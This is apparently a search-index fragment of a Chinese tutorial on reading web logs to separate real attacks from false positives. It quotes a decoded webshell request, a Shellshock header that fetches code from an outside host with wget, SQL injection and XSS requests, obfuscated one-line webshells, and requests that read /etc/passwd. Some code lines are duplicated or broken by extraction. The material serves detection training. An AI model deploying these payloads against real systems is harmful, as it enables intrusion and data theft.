\u5e38\u89c1\u8bef\u62a5\u539f\u56e0\u53ca\u6539\u8fdb\u63aa\u65bd","title":"Web\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/Web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#web","text":"1\u3001\u7f16\u7801 \u7f16\u7801\u65b9\u5f0f: URL\u7f16\u7801\u3001 BASE64\u7f16\u7801\u3001 16\u8fdb\u5236\u7f16\u7801\u3001UTF-8\u7f16\u7801 \u5b57\u7b26\u96c6: Unicode\uff0cGB2312\uff0c GBK\u7b49 16\u8fdb\u5236\u7801 \u4ee5x\u5f00\u5934 GET /news/society/201210/2358322923.shtml\" \u7ea2\u8272\u90e8\u520616\u8fdb\u5236\u89e3\u7801\u540e\u5982\u4e0b GET /news/society/201210/2358322923.shtml\" ; \u5728\u7ebf\u8f6c\u6362https:// www.bejson.com/convert/ ox2str/ UNICODE\u7f16\u7801: \u4ee5u\u3001\\u+\u3001 &#x\u3001&#\u5f00\u5934 \u6bd4\u5982 \\u0031\\u0038\\u0037\\u0030\\u0038\\u0036\\u0030\\u0039\\u0039\\u0030\\u0039 \u89e3\u7801\u540e\u662f\u4e2a\u624b\u673a\u53f718708609909 \u5728\u7ebf\u8f6c\u6362https:// www.online-toolz.com/tools/text-unicode-entities-convertor.php Base64\u7f16\u7801 base64\u662f\u7f51\u7edc\u4e0a\u6700\u5e38\u89c1\u7684\u7528\u4e8e\u4f20\u8f938Bit\u5b57\u8282\u4ee3\u7801\u7684\u7f16\u7801\u65b9\u5f0f\u4e4b\u4e00\uff0c \u8981\u6c42\u628a\u6bcfE \u4e2a8Bit\u7684\u5b57\u8282\u8f6c\u6362\u4e3a\u56db\u4e2a6Bit\u7684\u5b57\u8282\uff0c\u5728email\u4f20\u8f93\u4e2d\uff0c \u52a0\u5bc6\u662f\u80af\u5b9a\u7684\uff0c\u4f46\u662f\u52a0\u5bc6\u7684 \u76ee\u7684\u4e0d\u662f\u8ba9\u7528\u6237\u53d1\u9001\u975e\u5e38\u5b89\u5168\u7684Email\u3002\u8fd9\u79cd\u52a0\u5bc6\u65b9\u5f0f\u4e3b\u8981\u5c31\u662f\u201c\u9632\u541b\u5b50\u4e0d\u9632\u5c0f\u4eba\u201d\u3002 \u4e2a\u4eba\u8ba4\u4e3a\u8fd9\u4e2a\u4e0d\u80fd\u7b97\u52a0\u5bc6\uff0c\u56e0\u4e3a\u8fd9\u79cd\u7f16\u7801\u8fc7\u7a0b\u662f\u53ef\u9006\u7684 2\u3001\u89e3\u7801\u5de5\u5177 3\u3001\u6570\u636e\u63d0\u4ea4\u65b9\u5f0f \u6211\u4eec\u4e00\u822c\u662f\u901a\u8fc7GET\u3001POST \u3001COOKIE (\u4fd7\u79f0GPC)\u4e09\u90e8\u5206\u63d0\u4ea4\u53c2\u6570\u8bf7\u6c42\u7ed9\u670d\u52a1\u5668\u7684 GPC\u901a\u5e38\u88ab\u5229\u7528\u63d0\u4ea4\u6076\u610f\u53c2\u6570\u6267\u884cweb\u5e94\u7528\u5c42\u653b\u51fb,\u5176\u5b83HTTP\u5934\u90e8\u4e5f\u53ef\u88ab\u653b\u51fb\u8005\u5229\u7528 Type\u548cid\u5c31\u662f\u6211\u4eec\u63d0\u4ea4\u7684\u8bf7\u6c42\uff0c& \u4f8b: \u4e3a\u53c2\u6570\u5206\u9694\u7b26 POST /addnews.asp HTTP/1.1 t GET /news.asp?type=5&id=123 HTTP/1.1 Accept: / Referer: http://www .test.com/index.asp Accept- Language: zh-CN User-Agent: Moilla/4.0 (compatible; MSIE 8.0 Cookie\u91cc\u4e5f\u80fd\u63d0\u4ea4\u53c2\u6570\u8bf7\u6c42\uff0c \u5206\u53f7;\u4e3a\u53c2\u6570\u5206\u9694\u7b26 Accept- Encoding: gzip, deflate Host: www.test . com Connection: Keep- Alive POST body\u63d0\u4ea4\u53c2\u6570\u8bf7\u6c42\uff0c&\u4e3a\u53c2\u6570\u5206\u9694\u7b26 Cookie: ASPSESSIONID=MIIDIPGCCJGAFJ Title=test&content=test 4\u3001\u5e38\u89c1\u811a\u672c\u8bed\u8a00 5\u3001\u65e5\u5fd7\u8fd8\u539f \u8fd8\u539f\u65e5\u5fd7\u7684\u524d\u63d0\u662f\u83b7\u53d6\u5230\u653b\u51fb\u8005\u53d1\u9001\u7684\u6570\u636e\u5305\u5185\u5bb9 \u5982\u4f55\u83b7\u53d6\u653b\u51fb\u8005\u53d1\u9001\u7684\u6570\u636e? 1\u3001\u9632\u706b\u5899: \u9632\u706b\u5899\u5185\u7f6e\u6570\u636e\u4e2d\u5fc3\u4f1a\u8bb0\u5f55\u6570\u636e\u5305\u5185\u5bb9 2\u3001\u6001\u52bf\u611f\u77e5: . \u6001\u52bf\u611f\u77e5\u5916\u90e8\u5a01\u80c1\u611f\u77e5\u65e5\u5fd7\u91cc\u9762\u8bb0\u5f55\u7684\u6570\u636e\u5305\u5185\u5bb9 \u4e24\u8005\u90fd\u53ef\u4ee5\u5bfc\u51fa\u6570\u636e\u4e2d\u5fc3\u91cc\u9762\u7684\u65e5\u5fd7\uff0c\u5982\u679c\u53ef\u4ee5\u91cd\u73b0\uff0c\u53ef\u4ee5\u9632\u706b\u5899\u4e0a\u9762\u76f4\u63a5 \u6293\u53d6\u6570\u636e\u5305 URL+BASE64\u7f16\u7801\u8fd8\u539f \u4f8b\uff1a\u5f00\u5934\u8bb2\u5230\u8ba9\u5ba2\u6237\u6293\u72c2\u7684webshell\u65e5\u5fd7 POST /upfiles/bak.php ghost= %40**eval %01%28**base64_decode**%28%24**_POST**%5B**z0**%5D%29%29%3B**&z0=Q GluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X 21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0**%2B**fCIpOzskRj1iYXNlNjRfZGVjb2RlK CRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpe mUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw**%3D%3D**&z1=RDpc XEFQTVNlcnY1LjIuNlxcd3d3XFxwaHBNeUFkbWluXFxjb25maWcuc2FtcGxlLmluYy5waH A**%3D** url\u89e3\u7801\u4e00\u6b21 ghost=@eval(base64_decode($_POST[z0])); &z0 =QGluaV9zZXQoImRpc3BsYXlfZXJyb3Jz IiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDA pO2VjaG8oIi0+fCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCR GLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2Vja G8oInw8LSIpO2RpZSgpOw== &z1 =RDpcXEFQTVNlcnY1LjIuNlxcd3d3XFxwaHBNeUFkbW luXFxjb25maWcuc2FtcGxlLmluYy5waHA= \u5c06z0\u548cz1\u8fdb\u884cBASE64\u89e3\u7801\u5982\u4e0b z0=@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0 );echo(\">|\");; F=base64_decode( F=base64_decode( _POST[\"z1\"]); P=@fopen( P=@fopen( F, \"r\");echo(@fread( P,filesize( P,filesize( F)));@fclose($P);;echo(\"|<-\");die(); z1=D:\\APMServ5.2.6\\www\\phpMyAdmin\\config.sample.inc.php \u53ef\u4ee5\u770b\u51fa\u6765\u662f\u83dc\u5200\u5de5\u5177\u8fde\u63a5PHPwebshell\u8bfb\u53d6config.sample.inc.php\u5185\u5bb9\u7684\u884c\u4e3a\uff0c \u975e\u8bef\u62a5","title":"\u4e00.Web\u5e94\u7528\u57fa\u7840\u77e5\u8bc6\u4e0e\u5de5\u5177"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/Web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#_1","text":"","title":"\u4e8c.\u5982\u4f55\u5206\u6790\u65e5\u5fd7"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/Web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#1","text":"","title":"1\u3001\u5206\u6790\u65e5\u5fd7\u7684\u76ee\u7684"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/Web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#2","text":"\u2022 Get\u3001post \u8bf7\u6c42\u62a5\u6587\u7684url\u5b57\u6bb5 \u2022 Get \u3001post\u8bf7\u6c42\u62a5\u6587\u7684cookie\u5b57\u6bb5 \u2022 Get\u3001post\u8bf7\u6c42\u62a5\u6587\u7684referer\u5b57\u6bb5 \u2022 xss\u653b\u51fb \u2022 SQL\u6ce8\u5165 \u2022 \u547d\u4ee4\u6267\u884c \u2022 \u6587\u4ef6\u5305\u542b \u2022 \u76ee\u5f55\u7a7f\u8d8a \u2022 webshell \u2022 \u4fe1\u606f\u6cc4\u9732 \u2022 \u7f51\u7ad9\u626b\u63cf cookie\u5b57\u6bb5\u3001referer\u5b57\u6bb5\u3001post\u8868\u5355\u5b57\u6bb5\u548curl\u8bf7\u6c42\u7c7b\u4f3c \u2022 Post\u8bf7\u6c42\u62a5\u6587\u7684\u8868\u5355\u5b57\u6bb5 \u2022 Get \u3001post\u8bf7\u6c42\u62a5\u6587\u7684user-agent\u5b57\u6bb5 User-agent \u5b57\u6bb5\u6216\u8005\u7c7b\u4f3c\u8868\u793a\u8bbf\u95ee\u5ba2\u6237\u7aef\u8f6f\u4ef6\u7684\u5b57\u6bb5 \u6076\u610f\u722c\u866b\uff1aPython-urllib/2.6\u3001Baidu-YunGuanCe-ScanBot(ce.baidu.com) \u626b\u63cf\u5668\uff1amorfeus fucking scanner\u3001 Accept:acunetix/wvs sql\u6ce8\u5165\u6f0f\u6d1e\uff1asqlmap/1.0.8.15#dev ( http://sqlmap.org ) xss\u653b\u51fb\uff1a'%22()%26%25 prompt(961668) \u5176\u5b83\u975e\u5e38\u7279\u6b8a\u653b\u51fb \uff1aUser-Agent: () { :; }; /bin/mkdir -p /share/HDB_DATA/.../ && /usr/bin/wget -q -c http://lliillii.altervista.org/io.php 0<&1 2>&1 \u2022 Post\u8bf7\u6c42\u62a5\u6587\u7684\u8868\u5355\u5b57\u6bb5 \u2022 Http\u5e94\u7b54\u9875\u9762 http\u62a5\u6587\u8d1f\u8f7d\u90e8\u5206 \u2022 webshell \uff08\u8bf7\u6c42\u548c\u5e94\u7b54\u65b9\u5411\u90fd\u53ef\u80fd\uff09 \u2022 \u4fe1\u606f\u6cc4\u9732\uff08\u5e94\u7b54\u65b9\u5411\uff09 \u603b\u7ed3:\u4ec0\u4e48\u662f\u653b\u51fb \u2022 \u5728http\u62a5\u6587\u5934\u90e8\uff0c\u51fa\u73b0\u4e86\u4e00\u4e9b\u4e0d\u5e94\u8be5\u51fa\u73b0\u7684\u5b57\u6bb5 \u2022 url\u548cpost\u8868\u5355\uff0creferer\u3001cookie\u51fa\u73b0\u4e86sql\u8bed\u53e5\u3001\u7cfb\u7edf\u547d\u4ee4\u3001\u811a\u672c\u4ee3\u7801(js\u4ee3\u7801\u3001php\u4ee3\u7801)\u4e00\u822c\u90fd\u4e0d\u6b63 \u5e38 \u2022 \u8bbf\u95ee\u6216\u8005\u63a2\u6d4b\u4e86\u4e00\u4e9b\u654f\u611f\u6587\u4ef6 \u2022 \u5e94\u7b54\u62a5\u6587\u53ef\u80fd\u6cc4\u9732\u4e00\u4e9b\u7cfb\u654f\u611f\u4fe1\u606f\u7684","title":"2\u3001\u653b\u51fb\u51fa\u73b0\u7684\u4f4d\u7f6e"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/Web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#3","text":"\u2022 sql**\u6ce8\u5165** \u2022 \u63a2\u6d4b\u8bed\u53e5 \u2022 http://www.19cn.com/showdetail.asp?id=49 and 1=1 \u2022 http://www.19cn.com/showdetail.asp?id=49 or 1=1 \u2022 and char(124)%2Buser%2Bchar(124)=0 \uff08\u6ce8\u5165\u7c7b\u578b\u5224\u65ad\uff09 \u2022 \u6743\u9650\u5224\u65ad \u2022 and user>0 \u7528\u6237\u540d \u2022 and 1=(select IS_SRVROLEMEMBER('sysadmin')) \u6743\u9650 \u2022 and exists (select * from sysobjects) \u6570\u636e\u5e93\u7c7b\u578b\u5224\u65adsqlserver \u2022 \u67e5\u8be2\u6570\u636e \u2022 and 0<>(select count(*) from master.dbo.sysdatabases where name>1 and dbid=6) \u67e5\u5e93\u540d \u2022 and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 \u67e5\u8868\u540d \u2022 and (select count(\u5b57\u6bb5\u540d) from \u8868\u540d)>0 \u731c\u5b57\u6bb5 \u2022 and (select top 1 len(username) from admin)=X \u731c\u5b57\u6bb5\u503c \u2022 http://localhost/mytest/sqlinject/?id=1+UNION+SELECT+1,password,3,username,5,6,7,8,9+FROM+useunion select\u731c\u89e3\u6cd5\u2022 \u6570\u636e and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116 REQUEST: GET /webDisplay/ESite/English/DetailSubCollege.jsp?id=b27e56ef-d3b8-42e1-bf0b-6ca906ee6dec'and'x'='x HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1) Host: www.sada.sh.edu.cn Accept: */* Cookie: JSESSIONID=77790B475346A1A5DDA5BB269EF64903 REQUEST: GET /plus/search.php?keyword=as&c=d&typeArr[111%3D@`\\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12 ,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from +`%23@__admin`%23@`\\'`+]=a HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) Cookie: JSESSIONID=0000dB5Hac5-0MrKRsyqX6sr-Lr:-1 Host: www.bcu.edu.cn REQUEST: POST /login/login.asp HTTP/1.1 Content-Length: 304 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Host: 211.68.97.16:12000 Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: sqlmap/1.0.4.19#dev (http://sqlmap.org) Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7 Connection: close Pragma: no-cache Cache-Control: no-cache,no-store Content-Type: application/x-www-form-urlencoded; charset=utf-8 user_no=lNiv&user_pass=&u_type=4%' AND (SELECT 2017 FROM(SELECT COUNT(*),CONCAT(0x7178766b71,(SELECT (ELT(2017=2017,1))),0x7178787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='&Submit= +%B5%C7+%C2%BC+ 2021/3/26 REQUEST: POST /do/s_ rpc.php HTTP/1.1 Accept: */* Content-Type: application/x-www-form-urlencoded Host: www.edu.dl.cnContent-Length: 235 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/27.0.1453.93 Safari/537.36queryString=111%df' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECTconcat(0x3a,username,0x3a,password,0x3a) from qb_members limit0,1),FLOOR(RAND(0)*2))X FROM information_ schema.tables GROUP BY X)a) # HTTP/1.1 ication/x-www-form-urlencoded n 5 a/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like .1453.93 Safari/537.36 ' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECTme,0x3a,password,0x3a) from qb_members limit *2))X FROM information_schema.tables GROUP BY X)a) #\u5185\u90e8\u8d44\u6599 \u51c6\u8fbe\u5185\u90e8\u8d44 \u2022 xss**\u653b\u51fb** REQUEST: GET /CuteSoft_Client/'\"()&%<ScRiPt >prompt(994848)</ScRiPt>/SpellCheck.aspx HTTP/1.1 Referer: http://emp.bcu.edu.cn/ Cookie: ASP.NET_SessionId=gd1kgz55m5wmrt45oorcal55; ASPSESSIONIDASBQQBCS=MPNDNMCCBNGNECDGKAAIEDMF Host: emp.bcu.edu.cn Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36 Accept: */* REQUEST: GET /error_page.htm?flag='+alert('XSS')+' HTTP/1.1 Host: tuan.midea.com.cn Connection: Keep-Alive Accept: */* User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1\uff09 \u2022 alert(\"xss\") \u811a\u672c \u2022 / \u5c5e\u6027 \u2022 \u2022 \u4e8b\u4ef6 \u2022 \u2022 alert('xss'); \u2022 @import'javascript:alert(\"xss\")'; \u2022 \u2022 \u547d\u4ee4\u6267\u884c \u2022 GET /simple/tests/tmssql.php?do=phpinfo \u2022 GET /detail.php?id=/winnt/system32/cmd.exe?/c+dir+c:%5c \u2022 GET /cgi/maker/ptcmd.cgi?cmd=;cat+/tmp/config/usr.ini \u2022 GET /cgi/maker/ptcmd.cgi?cmd=;cat+/etc/passwd \u2022 \u76ee\u5f55\u7a7f\u8d8a \u2022 webshell \u2022 <%eval request(\"sb\")%> \u2022 <%execute request(\"sb\")%> \u2022 <?php eval( _POST[sb]);?> \u2022 <?php @eval( _POST[sb]);?> \u2022 <?php @eval( POST[sb]);?> \u2022 <? _POST['sa']( _POST['sa']( _POST['sb']);?> \u2022 <?php @preg_replace(\"/[email]/e\", _POST['h'],\"error\"); ?><br>\u2022 <%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(\"123\"))%><br>\u2022 <%r+k-es+k-p+k-on+k-se.co+k-d+k-e+k-p+k-age=936:e+k-v+k-a+k-lr+k-e+k-q+k-u+k-e+k-s+kt(\"c\")%>(UTF-7\u7f16\u7801\u683c\u5f0f\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c)<br> \u2022 <?php @ _POST['h'],\"error\"); ?><br>\u2022 <%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(\"123\"))%><br>\u2022 <%r+k-es+k-p+k-on+k-se.co+k-d+k-e+k-p+k-age=936:e+k-v+k-a+k-lr+k-e+k-q+k-u+k-e+k-s+kt(\"c\")%>(UTF-7\u7f16\u7801\u683c\u5f0f\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c)<br> \u2022 <?php @ =\"s\".\"s\"./ -/ - /\"e\"./ -/ - /\"r\";@ _=/*-/*-*/\"a\"./*-/*-*/ _=/*-/*-*/\"a\"./*-/*-*/ _./ -/ - /\"t\";@ _/*-/*-*/( _/*-/*-*/( / -/ - */{\"_P\"./ -/ - /\"OS\"./ -/ - /\"T\"}[/ -/ - /0/ -/ -*/]);?> \u2022 \u4fe1\u606f\u6cc4\u9732 \u2022 \u914d\u7f6e\u6587\u4ef6\u8bbf\u95ee \u2022 httpd.conf \u2022 htaccess \u2022 HTPASSWD \u2022 boot.ini \u2022 etc/passwd \u2022 Php.ini \u2022 Web.xml \u2022 \u7279\u6b8a\u540e\u7f00 \u2022 .mdb\u3001 .sql \u2022 .bak\u3001.sav\u3001.old\u3001.las \u2022 .tmp\u3001.temp \u2022 .rar\u3001.zip\u3001.bz\u3001gzip\u3001tar \u2022 .conf\u3001inc\u3001ini\u3001bat \u2022 .log\u3001stats\u3001statistics \u2022 Web.xml \u2022 \u76ee\u5f55\u6d4f\u89c8 \u2022 Parent Directory \u2022 Directory Listing For \u2022 Index of / \u2022 Welcome to the directory listing \u2022 \u9519\u8bef\u4fe1\u606f \u2022 \u6570\u636e\u5e93\u9519\u8bef\u4fe1\u606f \u2022 \u7a0b\u5e8f\u9519\u8bef\u4fe1\u606f \u2022 \u7f51\u7ad9\u626b\u63cf \u2022 \u6076\u610f\u722c\u866b \u2022 \u6d4f\u89c8\u5668\u7684user-agent\u5b57\u6bb5\u4e00\u822c\u90fd\u6bd4\u8f83\u56fa\u5b9a\u5982: \u2022 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) \u2014\u2014IE 9.0 \u2022 \u4e0d\u662f\u6d4f\u89c8\u5668\u7684user-agent \uff0c\u5f88\u53ef\u80fd\u5c31\u662f\u722c\u866b \u2022 \u626b\u63cf\u8f6f\u4ef6\uff1a user-agent\u5b57\u6bb5\u6216\u8005\u5355\u72ec\u6807\u793a\u81ea\u5df1\u7684\u8f6f\u4ef6 \u2022 \u7efc\u5408\u626b\u63cf\u5668\uff1a wvs\u3001 appscan \u2022 \u4e13\u7528\u626b\u63cf\u5668\uff1a sql\u6ce8\u5165 2021/3/26 \u51c6\u8fbe\u5185","title":"3\u3001\u653b\u51fb\u5e38\u89c1\u7684\u8bed\u53e5"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/Web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#4","text":"\u653b\u51fb\u7279\u70b9\uff1a \u2022 \u653b\u51fb\u4e00\u822c\u90fd\u6709\u4e00\u5b9a\u7684\u8fde\u7eed\u6027\uff0c\u6240\u4ee5\u4e00\u6bb5\u65f6\u95f4\u4f1a\u4ea7\u751f\u591a\u6761\u65e5\u5fd7\uff0c\u5e76\u4e14\u547d\u4e2d\u7279 \u5f81id\u662f\u6709\u4e00\u5b9a\u5206\u5e03\u7684\uff0c\u4e0d\u80fd\u662f\u53ea\u547d\u4e2d\u67d0\u4e2a\u7279\u5f81\u3002 \u2022 \u653b\u51fb\u4e00\u822c\u90fd\u4f1a\u501f\u52a9\u5de5\u5177\u8fdb\u884c\uff0c\u540c\u4e00\u4e2aIP\u5730\u5740\u65e5\u5fd7\u95f4\u9694\u8f83\u5c0f \uff0c\u53ef\u80fd\u4e00\u79d2\u4e2d\u4ea7 \u751f\u51e0\u6761\u65e5\u5fd7\uff0c\u660e\u663e\u4e0d\u662f\u4eba\u64cd\u4f5c\u6d4f\u89c8\u5668\u7684\u884c\u4e3a\u3002 \u2022 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u501f\u52a9\u4e00\u5b9a\u8df3\u677f\uff0c\u5982\u679cIP\u5730\u5740\u662f\u56fd\u5916\u7684\uff0c\u653b\u51fb\u5acc\u7591\u8f83\u5927","title":"4\u3001\u653b\u51fb\u5e38\u89c1\u7684\u7279\u70b9"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/Web%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#5","text":"\u2022 \u57fa\u4e8e\u653b\u51fbIP\u5730\u5740\u65b9\u6cd5\u5206\u6790\uff08\u9002\u7528\u65e5\u5fd7\u8f83\u591a\u7684\u60c5\u51b5\uff09 \u2022 \u627e\u51fa\u4e00\u4e2a\u660e\u663e\u7684\u653b\u51fb\u884c\u4e3a\u7684\u65e5\u5fd7 \u2022 \u6839\u636e\u8be5\u65e5\u5fd7\u627e\u51fa\u653b\u51fb\u6e90IP\u5730\u5740 \u2022 \u7b5b\u9009\u51fa\u9488\u5bf9\u8be5IP\u5730\u5740\u7684\u65e5\u5fd7\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u57fa\u672c\u90fd\u662f\u653b\u51fb\uff0c\u6ca1\u6709\u8bef\u62a5 \u2022 \u9488\u5bf9\u8be5IP\u5730\u5740\uff0c\u5229\u7528\u524d\u9762\u4ecb\u7ecd\u7684\u77e5\u8bc6\uff0c\u5c31\u53ef\u4ee5\u770b\u51fa\u653b\u51fb\u8005\u90fd\u53d1\u8d77\u4e86\u54ea\u4e9b\u653b \u51fb \u2022 \u57fa\u4e8e\u653b\u51fb\u65b9\u6cd5\u5206\u6790\uff08\u9002\u7528\u6bcf\u7c7b\u4e0d\u592a\u591a\u7684\u653b\u51fb\uff09 \u2022 \u770b\u653b\u51fb\u8bed\u53e5\uff0c\u662f\u5426\u662f\u660e\u663e\u653b\u51fb\u884c\u4e3a \u2022 \u5982\u679c\u80fd\u770b\u51fa\u662f\u660e\u663e\u7684\u884c\u4e3a\uff0c\u5c31\u53ef\u4ee5\u786e\u5b9a\u662f\u653b\u51fb \u2022 \u5982\u679c\u4e0d\u786e\u5b9a\uff0c\u8fd8\u9700\u8981\u7ed3\u5408\u5176\u4ed6\u53c2\u6570\uff0c \u6e90IP\u5730\u5740 \uff1a\u662f\u5426\u51fa\u73b0\u8fc7\u5176\u4ed6\u7c7b\u578b\u53ef\u4ee5\u660e\u786e\u7684\u653b\u51fb\u884c\u4e3a \u653b\u51fb\u65f6\u95f4\uff1a\u5982\u679c\u534a\u591c\u6216\u8005\u51cc\u6668\u6d3b\u52a8\u6bd4\u8f83\u9891\u7e41 \uff0c\u53ef\u4ee5\u6000\u7591\u4e3a\u653b\u51fb\u3002 \u65e5\u5fd7\u9891\u7387 \uff1a\u4e00\u79d2\u4e2d\u51fa\u73b0\u51e0\u6b21\u65e5\u5fd7\uff0c\u53ef\u4ee5\u6000\u7591\u4e3a\u653b\u51fb\u3002 \u653b\u51fb\u4f4d\u7f6e\uff1a\u56fd\u5916\u7684ip\u5730\u5740 \uff0c\u53ef\u4ee5\u6000\u7591\u4e3a\u653b\u51fb \u62a5\u6587\u8bed\u4e49\u5206\u6790\uff1a\u6bd4\u5982\u8bbf\u95eeadmin\u6587\u4ef6\u5939 \uff0c\u53ef\u80fd\u662f\u6709\u653b\u51fb\u884c\u4e3a \u4e0a\u8ff0\u51e0\u4e2a\u53c2\u6570\u53ef\u4ee5\u7ec4\u5408\u5206\u6790\uff0c\u8fdb\u4e00\u6b65\u786e\u5b9a\u653b\u51fb \u95ee\u9898 \uff1a\u4e00\u4e9b\u7f51\u7ad9\u5b9e\u73b0\u5b58\u5728\u5b89\u5168\u9690\u60a3 \uff0c\u7528\u6237\u7684\u4e00\u4e9b\u6b63\u5e38\u6d41\u91cf\uff0c\u4e5f\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u7be1\u6539\uff0c \u76f4\u63a5\u53d1\u8d77\u653b\u51fb\u3002 \u2022 \u5e38\u89c1\u95ee\u9898\uff1a \u2022 url\u53c2\u6570\u5b9e\u73b0\u65f6\u76f4\u63a5\u4f20\u9012sql\u8bed\u53e5 \u2022 url\u53c2\u6570\u5b9e\u73b0\u65f6\u53ef\u4ee5\u4f20\u9012js\u811a\u672c \u2022 url\u53c2\u6570\u5b9e\u73b0\u65f6\u7528../\u8fdb\u884c\u76ee\u5f55\u7a7f\u8d8a\u8bbf\u95ee\u6587\u4ef6 \u2022 url\u53c2\u6570\u5b9e\u73b0\u65f6\u76f4\u63a5\u8c03\u7528\u4e00\u4e9b\u7cfb\u7edf\u51fd\u6570 \u2022 url\u53c2\u6570\u53ef\u4ee5\u8fdb\u884c\u57df\u540d\u91cd\u5b9a\u5411 \u2022 \u7cfb\u7edf\u914d\u7f6e\u5b58\u5728\u5b89\u5168\u9690\u60a3 \u2022 \u901a\u8fc7\u53c2\u6570\u76f4\u63a5\u4f20sql\u8bed\u53e5\uff08 sql\u6ce8\u5165\u7c7b\u8bef\u62a5\uff09 \u2022 \u901a\u8fc7\u53c2\u6570\u76f4\u63a5\u4f20js\u811a\u672c \uff08XSS\u4e2d\u8bef\u62a5\u8f83\u591a\uff09 \u2022 \u901a\u8fc7../\u7a7f\u8d8a\u76ee\u5f55\u8bbf\u95ee\u6587\u4ef6 \uff08\u76ee\u5f55\u7a7f\u8d8a\u8bef\u62a5\uff09 \u2022 \u901a\u8fc7url\u53c2\u6570\u8fdb\u884c\u57df\u540d\u8df3\u8f6c\uff08\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u8bef\u62a5\uff09 \u2022 \u5f00\u542f\u4e86\u76ee\u5f55\u8bbf\u95ee\u529f\u80fd\uff08\u4fe1\u606f\u6cc4\u9732\uff09 \u653b\u51fb\u548c\u6b63\u5e38\u5e94\u7528\u533a\u5206\u4e0d\u5f00 \u2022 \u524d\u9762\u8bf4\u7684\u7528\u6237\u7f51\u7ad9\u5b58\u5728\u4e00\u5b9a\u5b89\u5168\u9690\u60a3\u662f\u8fd9\u79cd\u60c5\u51b5\u7684\u4e00\u79cd \u2022 \u8fd8\u6709\u4e00\u79cd\u60c5\u51b5 \uff0c\u7528\u6237\u7684\u5e94\u7528\u6bd4\u8f83\u7279\u6b8a\uff0c\u7406\u8bba\u4e0a\u6240\u6709\u89c4\u5219\u90fd\u80fd\u8bef\u62a5 \u2022 \u7528\u6237\u662f\u4e00\u4e2a\u8bba\u575b\u7c7b\u5e94\u7528\uff0c\u53ef\u4ee5\u63d0\u4ea4\u4efb\u610f\u4e1c\u897f\uff0c\u5305\u62ec\u6587\u7ae0\u7c7b \u2022 \u7528\u6237\u662f\u4e00\u4e2a\u4ee3\u7801\u63d0\u4ea4\u8ba8\u8bba\u7f51\u7ad9\uff0c\u7ecf\u5e38\u901a\u8fc7post\u8868\u5355\u63d0\u4ea4\u4ee3\u7801 \u2022 \u8fd9\u7c7b\u5e94\u7528\u4e3b\u8981\u4f53\u73b0\u5728\u5b66\u6821\u5e94\u7528\u4e2d\u8f83\u591a \u2022 